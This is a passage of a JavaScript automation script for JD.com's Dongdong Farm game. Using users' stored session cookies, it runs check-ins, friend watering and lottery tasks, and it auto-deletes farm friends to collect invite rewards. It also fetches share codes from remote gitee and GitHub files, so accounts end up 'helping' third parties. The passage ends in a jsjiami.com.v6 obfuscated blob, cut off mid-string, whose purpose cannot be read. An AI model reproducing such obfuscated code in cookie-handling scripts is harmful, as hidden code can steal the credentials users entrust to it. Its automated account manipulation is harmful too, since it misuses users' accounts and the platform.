    if (!$.getdata(helpSuccessPeoplesKey)) {
      //把前一天的清除
      $.setdata('', timeFormat(Date.now() - 24 * 60 * 60 * 1000) + $.farmInfo.farmUserPro.shareCode);
      $.setdata('', helpSuccessPeoplesKey);
    }
    if (helpSuccessPeoples) {
      if ($.getdata(helpSuccessPeoplesKey)) {
        $.setdata($.getdata(helpSuccessPeoplesKey) + ',' + helpSuccessPeoples, helpSuccessPeoplesKey);
      } else {
        $.setdata(helpSuccessPeoples, helpSuccessPeoplesKey);
      }
    }
    helpSuccessPeoples = $.getdata(helpSuccessPeoplesKey);
  }
  if (helpSuccessPeoples && helpSuccessPeoples.length > 0) {
    message += `【您助力的好友👬】${helpSuccessPeoples.substr(0, helpSuccessPeoples.length - 1)}\n`;
  }
  if (salveHelpAddWater > 0) {
    // message += `【助力好友👬】获得${salveHelpAddWater}g💧\n`;
    console.log(`【助力好友👬】获得${salveHelpAddWater}g💧\n`);
  }
  message += `【今日剩余助力👬】${remainTimes}次\n`;
  console.log('助力好友结束，即将开始领取额外水滴奖励\n');
}
//水滴雨
async function executeWaterRains() {
  let executeWaterRain = !$.farmTask.waterRainInit.f;
  if (executeWaterRain) {
    console.log(`水滴雨任务，每天两次，最多可得10g水滴`);
    console.log(`两次水滴雨任务是否全部完成：${$.farmTask.waterRainInit.f ? '是' : '否'}`);
    if ($.farmTask.waterRainInit.lastTime) {
      if (Date.now() < ($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000)) {
        executeWaterRain = false;
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`;
        console.log(`\`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`);
      }
    }
    if (executeWaterRain) {
      console.log(`开始水滴雨任务,这是第${$.farmTask.waterRainInit.winTimes + 1}次，剩余${2 - ($.farmTask.waterRainInit.winTimes + 1)}次`);
      await waterRainForFarm();
      console.log('水滴雨waterRain');
      if ($.waterRain.code === '0') {
        console.log('水滴雨任务执行成功，获得水滴：' + $.waterRain.addEnergy + 'g');
        console.log(`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`);
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`;
      }
    }
  } else {
    // message += `【水滴雨】已全部完成，获得20g💧\n`;
  }
}
//打卡领水活动
async function clockInIn() {
  console.log('开始打卡领水活动（签到，关注，领券）');
  await clockInInitForFarm();
  if ($.clockInInit.code === '0') {
    // 签到得水滴
    if (!$.clockInInit.todaySigned) {
      console.log('开始今日签到');
      await clockInForFarm();
      console.log(`打卡结果${JSON.stringify($.clockInForFarmRes)}`);
      if ($.clockInForFarmRes.code === '0') {
        // message += `【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`;
        console.log(`【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`)
        if ($.clockInForFarmRes.signDay === 7) {
          //可以领取惊喜礼包
          console.log('开始领取--惊喜礼包38g水滴');
          await gotClockInGift();
          if ($.gotClockInGiftRes.code === '0') {
            // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
            console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
          }
        }
      }
    }
    if ($.clockInInit.todaySigned && $.clockInInit.totalSigned === 7) {
      console.log('开始领取--惊喜礼包38g水滴');
      await gotClockInGift();
      if ($.gotClockInGiftRes.code === '0') {
        // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
        console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
      }
    }
    // 限时关注得水滴
    if ($.clockInInit.themes && $.clockInInit.themes.length > 0) {
      for (let item of $.clockInInit.themes) {
        if (!item.hadGot) {
          console.log(`关注ID${item.id}`);
          await clockInFollowForFarm(item.id, "theme", "1");
          console.log(`themeStep1--结果${JSON.stringify($.themeStep1)}`);
          if ($.themeStep1.code === '0') {
            await clockInFollowForFarm(item.id, "theme", "2");
            console.log(`themeStep2--结果${JSON.stringify($.themeStep2)}`);
            if ($.themeStep2.code === '0') {
              console.log(`关注${item.name}，获得水滴${$.themeStep2.amount}g`);
            }
          }
        }
      }
    }
    // 限时领券得水滴
    if ($.clockInInit.venderCoupons && $.clockInInit.venderCoupons.length > 0) {
      for (let item of $.clockInInit.venderCoupons) {
        if (!item.hadGot) {
          console.log(`领券的ID${item.id}`);
          await clockInFollowForFarm(item.id, "venderCoupon", "1");
          console.log(`venderCouponStep1--结果${JSON.stringify($.venderCouponStep1)}`);
          if ($.venderCouponStep1.code === '0') {
            await clockInFollowForFarm(item.id, "venderCoupon", "2");
            if ($.venderCouponStep2.code === '0') {
              console.log(`venderCouponStep2--结果${JSON.stringify($.venderCouponStep2)}`);
              console.log(`从${item.name}领券，获得水滴${$.venderCouponStep2.amount}g`);
            }
          }
        }
      }
    }
  }
  console.log('开始打卡领水活动（签到，关注，领券）结束\n');
}
//
async function getAwardInviteFriend() {
  await friendListInitForFarm();//查询好友列表
  //console.log(`查询好友列表数据：${JSON.stringify($.friendList)}\n`)
  if ($.friendList) {
    console.log(`\n今日已邀请好友${$.friendList.inviteFriendCount}个 / 每日邀请上限${$.friendList.inviteFriendMax}个`);
    console.log(`开始删除${$.friendList.friends && $.friendList.friends.length}个好友,可拿每天的邀请奖励`);
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      for (let friend of $.friendList.friends) {
        console.log(`\n开始删除好友 [${friend.shareCode}]`);
        const deleteFriendForFarm = await request('deleteFriendForFarm', { "shareCode": `${friend.shareCode}`,"version":8,"channel":1 });
        if (deleteFriendForFarm && deleteFriendForFarm.code === '0') {
          console.log(`删除好友 [${friend.shareCode}] 成功\n`);
        }
      }
    }
    await receiveFriendInvite();//为他人助力,接受邀请成为别人的好友
    if ($.friendList.inviteFriendCount > 0) {
      if ($.friendList.inviteFriendCount > $.friendList.inviteFriendGotAwardCount) {
        console.log('开始领取邀请好友的奖励');
        await awardInviteFriendForFarm();
        console.log(`领取邀请好友的奖励结果：：${JSON.stringify($.awardInviteFriendRes)}`);
      }
    } else {
      console.log('今日未邀请过好友')
    }
  } else {
    console.log(`查询好友列表失败\n`);
  }
}
//给好友浇水
async function doFriendsWater() {
  await friendListInitForFarm();
  console.log('开始给好友浇水...');
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax } = $.farmTask.waterFriendTaskInit;
  console.log(`今日已给${waterFriendCountKey}个好友浇水`);
  if (waterFriendCountKey < waterFriendMax) {
    let needWaterFriends = [];
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      $.friendList.friends.map((item, index) => {
        if (item.friendState === 1) {
          if (needWaterFriends.length < (waterFriendMax - waterFriendCountKey)) {
            needWaterFriends.push(item.shareCode);
          }
        }
      });
      //TODO ,发现bug,github action运行发现有些账号第一次没有给3个好友浇水
      console.log(`需要浇水的好友列表shareCodes:${JSON.stringify(needWaterFriends)}`);
      let waterFriendsCount = 0, cardInfoStr = '';
      for (let index = 0; index < needWaterFriends.length; index ++) {
        await waterFriendForFarm(needWaterFriends[index]);
        console.log(`为第${index+1}个好友浇水结果:${JSON.stringify($.waterFriendForFarmRes)}\n`)
        if ($.waterFriendForFarmRes.code === '0') {
          waterFriendsCount ++;
          if ($.waterFriendForFarmRes.cardInfo) {
            console.log('为好友浇水获得道具了');
            if ($.waterFriendForFarmRes.cardInfo.type === 'beanCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴换豆卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'fastCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `快速浇水卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'doubleCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴翻倍卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'signCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `加签卡,`;
            }
          }
        } else if ($.waterFriendForFarmRes.code === '11') {
          console.log('水滴不够,跳出浇水')
        }
      }
      // message += `【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`;
      console.log(`【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`);
      if (cardInfoStr && cardInfoStr.length > 0) {
        // message += `【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`;
        console.log(`【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`);
      }
    } else {
      console.log('您的好友列表暂无好友,快去邀请您的好友吧!')
    }
  } else {
    console.log(`今日已为好友浇水量已达${waterFriendMax}个`)
  }
}
//领取给3个好友浇水后的奖励水滴
async function getWaterFriendGotAward() {
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax, waterFriendSendWater, waterFriendGotAward } = $.farmTask.waterFriendTaskInit
  if (waterFriendCountKey >= waterFriendMax) {
    if (!waterFriendGotAward) {
      await waterFriendGotAwardForFarm();
      console.log(`领取给${waterFriendMax}个好友浇水后的奖励水滴::${JSON.stringify($.waterFriendGotAwardRes)}`)
      if ($.waterFriendGotAwardRes.code === '0') {
        // message += `【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`;
        console.log(`【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`);
      }
    } else {
      console.log(`给好友浇水的${waterFriendSendWater}g水滴奖励已领取\n`);
      // message += `【给${waterFriendMax}好友浇水】奖励${waterFriendSendWater}g水滴已领取\n`;
    }
  } else {
    console.log(`暂未给${waterFriendMax}个好友浇水\n`);
  }
}
//接收成为对方好友的邀请
async function receiveFriendInvite() {
  for (let code of newShareCodes) {
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('自己不能邀请自己成为好友噢\n')
      continue
    }
    await inviteFriend(code);
    // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
    if ($.inviteFriendRes.helpResult.code === '0') {
      console.log(`接收邀请成为好友结果成功,您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
    } else if ($.inviteFriendRes.helpResult.code === '17') {
      console.log(`接收邀请成为好友结果失败,对方已是您的好友`)
    }
  }
  // console.log(`开始接受6fbd26cc27ac44d6a7fed34092453f77的邀请\n`)
  // await inviteFriend('6fbd26cc27ac44d6a7fed34092453f77');
  // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
  // if ($.inviteFriendRes.helpResult.code === '0') {
  //   console.log(`您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
  // } else if ($.inviteFriendRes.helpResult.code === '17') {
  //   console.log(`对方已是您的好友`)
  // }
}
async function duck() {
  for (let i = 0; i < 10; i++) {
    //这里循环十次
    await getFullCollectionReward();
    if ($.duckRes.code === '0') {
      if (!$.duckRes.hasLimit) {
        console.log(`小鸭子游戏:${$.duckRes.title}`);
        // if ($.duckRes.type !== 3) {
        //   console.log(`${$.duckRes.title}`);
        //   if ($.duckRes.type === 1) {
        //     message += `【小鸭子】为你带回了水滴\n`;
        //   } else if ($.duckRes.type === 2) {
        //     message += `【小鸭子】为你带回快速浇水卡\n`
        //   }
        // }
      } else {
        console.log(`${$.duckRes.title}`)
        break;
      }
    } else if ($.duckRes.code === '10') {
      console.log(`小鸭子游戏达到上限`)
      break;
    }
  }
}
// ========================API调用接口========================
//鸭子，点我有惊喜
async function getFullCollectionReward() {
  return new Promise(resolve => {
    const body = {"type": 2, "version": 6, "channel": 2};
    $.post(taskUrl("getFullCollectionReward", body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.duckRes = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

/**
 * 领取10次浇水奖励API
 */
async function totalWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.totalWaterReward = await request(functionId);
}
//领取首次浇水奖励API
async function firstWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.firstWaterReward = await request(functionId);
}
//领取给3个好友浇水后的奖励水滴API
async function waterFriendGotAwardForFarm() {
  const functionId = arguments.callee.name.toString();
  $.waterFriendGotAwardRes = await request(functionId, {"version": 4, "channel": 1});
}
// 查询背包道具卡API
async function myCardInfoForFarm() {
  const functionId = arguments.callee.name.toString();
  $.myCardInfoRes = await request(functionId, {"version": 5, "channel": 1});
}
//使用道具卡API
async function userMyCardForFarm(cardType) {
  const functionId = arguments.callee.name.toString();
  $.userMyCardRes = await request(functionId, {"cardType": cardType});
}
/**
 * 领取浇水过程中的阶段性奖励
 * @param type
 * @returns {Promise<void>}
 */
async function gotStageAwardForFarm(type) {
  $.gotStageAwardForFarmRes = await request(arguments.callee.name.toString(), {'type': type});
}
//浇水API
async function waterGoodForFarm() {
  await $.wait(1000);
  console.log('等待了1秒');

  const functionId = arguments.callee.name.toString();
  $.waterResult = await request(functionId);
}
// 初始化集卡抽奖活动数据API
async function initForTurntableFarm() {
  $.initForTurntableFarmRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}
async function lotteryForTurntableFarm() {
  await $.wait(2000);
  console.log('等待了2秒');
  $.lotteryRes = await request(arguments.callee.name.toString(), {type: 1, version: 4, channel: 1});
}

async function timingAwardForTurntableFarm() {
  $.timingAwardRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}

async function browserForTurntableFarm(type, adId) {
  if (type === 1) {
    console.log('浏览爆品会场');
  }
  if (type === 2) {
    console.log('天天抽奖浏览任务领取水滴');
  }
  const body = {"type": type,"adId": adId,"version":4,"channel":1};
  $.browserForTurntableFarmRes = await request(arguments.callee.name.toString(), body);
  // 浏览爆品会场8秒
}
//天天抽奖浏览任务领取水滴API
async function browserForTurntableFarm2(type) {
  const body = {"type":2,"adId": type,"version":4,"channel":1};
  $.browserForTurntableFarm2Res = await request('browserForTurntableFarm', body);
}
/**
 * 天天抽奖拿好礼-助力API(每人每天三次助力机会)
 */
async function lotteryMasterHelp() {
  $.lotteryMasterHelpRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-3',
    babelChannel: "3",
    version: 4,
    channel: 1
  });
}

//领取5人助力后的额外奖励API
async function masterGotFinishedTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterGotFinished = await request(functionId);
}
//助力好友信息API
async function masterHelpTaskInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterHelpResult = await request(functionId);
}
//接受对方邀请,成为对方好友的API
async function inviteFriend() {
  $.inviteFriendRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-inviteFriend',
    version: 4,
    channel: 2
  });
}
// 助力好友API
async function masterHelp() {
  $.helpResult = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0],
    babelChannel: "3",
    version: 2,
    channel: 1
  });
}
/**
 * 水滴雨API
 */
async function waterRainForFarm() {
  const functionId = arguments.callee.name.toString();
  const body = {"type": 1, "hongBaoTimes": 100, "version": 3};
  $.waterRain = await request(functionId, body);
}
/**
 * 打卡领水API
 */
async function clockInInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInInit = await request(functionId);
}

// 连续签到API
async function clockInForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInForFarmRes = await request(functionId, {"type": 1});
}

//关注，领券等API
async function clockInFollowForFarm(id, type, step) {
  const functionId = arguments.callee.name.toString();
  let body = {
    id,
    type,
    step
  }
  if (type === 'theme') {
    if (step === '1') {
      $.themeStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.themeStep2 = await request(functionId, body);
    }
  } else if (type === 'venderCoupon') {
    if (step === '1') {
      $.venderCouponStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.venderCouponStep2 = await request(functionId, body);
    }
  }
}

// 领取连续签到7天的惊喜礼包API
async function gotClockInGift() {
  $.gotClockInGiftRes = await request('clockInForFarm', {"type": 2})
}

//定时领水API
async function gotThreeMealForFarm() {
  const functionId = arguments.callee.name.toString();
  $.threeMeal = await request(functionId);
}
/**
 * 浏览广告任务API
 * type为0时, 完成浏览任务
 * type为1时, 领取浏览任务奖励
 */
async function browseAdTaskForFarm(advertId, type) {
  const functionId = arguments.callee.name.toString();
  if (type === 0) {
    $.browseResult = await request(functionId, {advertId, type});
  } else if (type === 1) {
    $.browseRwardResult = await request(functionId, {advertId, type});
  }
}
// 被水滴砸中API
async function gotWaterGoalTaskForFarm() {
  $.goalResult = await request(arguments.callee.name.toString(), {type: 3});
}
//签到API
async function signForFarm() {
  const functionId = arguments.callee.name.toString();
  $.signResult = await request(functionId);
}
/**
 * 初始化农场, 可获取果树及用户信息API
 */
async function initForFarm() {
  return new Promise(resolve => {
    const option =  {
      url: `${JD_API_HOST}?functionId=initForFarm`,
      body: `body=${escape(JSON.stringify({"version":4}))}&appid=wh5&clientVersion=9.1.0`,
      headers: {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "no-cache",
        "cookie": cookie,
        "origin": "https://home.m.jd.com",
        "pragma": "no-cache",
        "referer": "https://home.m.jd.com/myJd/newhome.action",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        "Content-Type": "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.post(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.farmInfo = JSON.parse(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

// 初始化任务列表API
async function taskInitForFarm() {
  console.log('\n初始化任务列表')
  const functionId = arguments.callee.name.toString();
  $.farmTask = await request(functionId);
}
//获取好友列表API
async function friendListInitForFarm() {
  $.friendList = await request('friendListInitForFarm', {"version": 4, "channel": 1});
  // console.log('aa', aa);
}
// 领取邀请好友的奖励API
async function awardInviteFriendForFarm() {
  $.awardInviteFriendRes = await request('awardInviteFriendForFarm');
}
//为好友浇水API
async function waterFriendForFarm(shareCode) {
  const body = {"shareCode": shareCode, "version": 6, "channel": 1}
  $.waterFriendForFarmRes = await request('waterFriendForFarm', body);
}
async function showMsg() {
  if ($.isNode() && process.env.FRUIT_NOTIFY_CONTROL) {
    $.ctrTemp = `${process.env.FRUIT_NOTIFY_CONTROL}` === 'false';
  } else if ($.getdata('jdFruitNotify')) {
    $.ctrTemp = $.getdata('jdFruitNotify') === 'false';
  } else {
    $.ctrTemp = `${jdNotify}` === 'false';
  }
  if ($.ctrTemp) {
    $.msg($.name, subTitle, message, option);
    if ($.isNode()) {
      allMessage += `${subTitle}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
      // await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `${subTitle}\n${message}`);
    }
  } else {
    $.log(`\n${message}\n`);
  }
}

function timeFormat(time) {
  let date;
  if (time) {
    date = new Date(time)
  } else {
    date = new Date();
  }
  return date.getFullYear() + '-' + ((date.getMonth() + 1) >= 10 ? (date.getMonth() + 1) : '0' + (date.getMonth() + 1)) + '-' + (date.getDate() >= 10 ? date.getDate() : '0' + date.getDate());
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://gitee.com/Soundantony/RandomShareCode/raw/master/JD_Fruit.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Fruit.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdFruitShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdFruitShareArr[$.index - 1]) {
      newShareCodes = jdFruitShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      // newShareCodes = newShareCodes.concat(readShareCodeRes.data || []);
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdFruitShareCodes = $.isNode() ? require('./jdFruitShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      let cookiesData = $.getdata('CookiesJD') || "[]";
      cookiesData = jsonParse(cookiesData);
      cookiesArr = cookiesData.map(item => item.cookie);
      cookiesArr.reverse();
      cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
      cookiesArr.reverse();
      cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdFruitShareCodes).forEach((item) => {
        if (jdFruitShareCodes[item]) {
          jdFruitShareArr.push(jdFruitShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_fruit1', 'jd_fruit2', 'jd_fruit3', 'jd_fruit4'];
      const boxShareCodeArr2 = ['jd2_fruit1', 'jd2_fruit2', 'jd2_fruit3', 'jd2_fruit4'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
    }
    // console.log(`jdFruitShareArr::${JSON.stringify(jdFruitShareArr)}`)
    // console.log(`jdFruitShareArr账号长度::${jdFruitShareArr.length}`)
    console.log(`您提供了${jdFruitShareArr.length}个账号的农场助力码\n`);
    resolve()
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}, timeout = 1000){
  return new Promise(resolve => {
    setTimeout(() => {
      $.get(taskUrl(function_id, body), (err, resp, data) => {
        try {
          if (err) {
            console.log('\n东东农场: API查询请求失败 ‼️‼️')
            console.log(JSON.stringify(err));
            console.log(`function_id:${function_id}`)
            $.logErr(err);
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
            }
          }
        } catch (e) {
          $.logErr(e, resp);
        } finally {
          resolve(data);
        }
      })
    }, timeout)
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function taskUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${function_id}&appid=wh5&body=${escape(JSON.stringify(body))}`,
    headers: {
      Cookie: cookie,
      UserAgent: $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
    },
    timeout: 10000,
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodX='jsjiami.com.v6',_0x2cf9=[_0xodX,'w7ccXcKJw5E=','ecOfw6tTw60=','FCYuUsOR','w70qXELCrFUv','wp8BeV0=','w6sYQcKdw4B9','w4ZzwpTDrsOf','wonDoMKjw69Zd1A=','FF/Cvlk=','w7o8f8OOw4jDiQ==','FsOeF2LChcOKwps=','PzwZfg==','SsKJw7BQ','Digew60P','w5QZVcKow4E=','YDPDgg==','w7jDocKyAg==','WQ8sUuits+azreWmtei0i+++jeitnOaiveafree9pei0uemFmuivhw==','wr/CkEYZwpY=','wrnCoMOvFMK9','B058wpbDkQ==','OMKlPG7Dsg==','cMKNTHTDtA==','MBxqd8On','VcKcw61Uwr7CikIMw7vDgMO3QcKZOgsNwpkdSgTCiHgzwodhw7IZKcOmwrXDpMKRwpJyw5NwT8KHHMKyBsObYcKkd8OcNsKFDcOXdsO7wrofHzFzd8Oqw6zDtBYwbsOMRmXCow==','QTPDn2rDkgvCiUbCvcKhwpPCgW9GwroBHcKVwpjCtSTCkzMmw5tkc8KQwrvCsMKFDUJpw5AJwoAoTcOEVsK/VsKHZMKFwo8Vwrl+wpjCjE7DkcO1JQsWccKEGsKDw4tkcmprw60yYsOlw4PDhnXCvn5MwrInw41hDMK1HFvClgo+wpcIXsK5JUXCsAnDpsO3wp7CnMOJwpNjw4nCrsOMw4fCgBbCllbDnBfCv0VBwqDCscOUbcOzV8Oyw5Enw6zDoWBtwrcywo0Iw4zCq3bDnybDicKUwpPDsCzDqcOcVFPCvcOpcMKaw53Crz5rwrY=','w5PCjlg2w7g=','w5wKXSzCjg==','X8KZw6U=','wqTDp8OLwqnCow==','bMOHwpXCpUU=','PcOsEWzCgA==','wrjDgMKPwpDCnQ==','RsOswo3CpW4=','w7nDssKoLMOX','w5kpw4/CrMO4','wp7DhMOqwp7CnQ==','w5onw7UIQQ==','w6sSSMK/w4Zn','w5AQw5DCsA==','w6bCp8KNSOitiOazgOWktOi2lO+9o+iumeaiueacrOe9vei2remEuOivqA==','EmJDw6LDi8K/wofCog==','w6Y4Y8Oaw5k=','GCIQeMOxw4bDoA==','WcKJw61FworDlRkS','wrHD